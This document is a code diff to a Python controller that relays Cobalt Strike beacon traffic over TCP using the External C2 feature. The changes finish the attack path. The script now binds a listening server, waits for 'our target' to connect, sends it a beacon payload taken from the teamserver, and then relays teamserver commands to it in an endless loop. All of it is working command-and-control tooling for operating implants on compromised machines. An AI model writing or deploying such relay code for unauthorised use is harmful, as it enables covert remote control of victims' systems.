@@ -18,16 +18,18 @@ class TCPinfo:
     """
     @brief Class to hold info for TCP session
     """
-    def __init__(self, ts_ip, ts_port, srv_port, pipe_str):
+    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str):
         """
 
         :param ts_ip: IP address of CS Teamserver
         :param ts_port: Port of CS Teamserver
-        :param dst_port: Port of server to listen on
+        :param srv_ip: IP to bind to on server
+        :param srv_port: Port of server to listen on
         :param pipe_str: String for named pipe on client
         """
         self.ts_ip = ts_ip
         self.ts_port = ts_port
+        self.srv_ip = srv_ip
         self.srv_port = srv_port
         self.pipe_str = pipe_str
         
@@ -125,9 +127,13 @@ class ExternalC2Controller:
         :param tcpinfo: Class with user TCP info
         :return: data received from beacon
         """
+        try:
+            data_length = self._socketBeacon.recv(4)
+        except:
+            print("Recv failed.")
+            return None
         data = self._socketBeacon.recv(4096)
-        
-        return data[4:]
+        return data
 
 
     def run(self, tcpinfo):
@@ -153,7 +159,11 @@ class ExternalC2Controller:
         data = self.recv_from_ts()
 
         # Now that we have our beacon to send, wait for a connection from our target
-        #TODO: Open server
+        self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._socketServer.bind((tcpinfo.srv_ip,tcpinfo.srv_port))
+        self._socketServer.listen()
+        self._socketBeacon, beacon_addr = self._socketServer.accept()
+        print("Connected to : {}".format(beacon_addr))
 
         # Send beacon payload to target
         self.sendToBeacon(tcpinfo, data)
@@ -171,6 +181,9 @@ class ExternalC2Controller:
             data = self.recv_from_ts()
             print("Received %d bytes from TS and sending to beacon" % len(data))
             self.sendToBeacon(tcpinfo, data)
+        self._socketBeacon.close()
+        self._socketServer.close()
+        self._socketTS.close()
 
 
 parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
@@ -178,10 +191,12 @@ parser = argparse.ArgumentParser(description='Program to provide TCP communicati
                                        "%(prog)s [TS_IP] [SRV_PORT] [PIPE_STR]"
                                        "\nUse '%(prog)s -h' for more information.")
 parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
-parser.add_argument('srv_port', help="Port number to open on server.")
+parser.add_argument('srv_ip', help="IP to bind to on server.")
+parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
-tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_port, args.pipe_str)
-controller.run(tcpinfo)
+tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
+while True:
+    controller.run(tcpinfo)
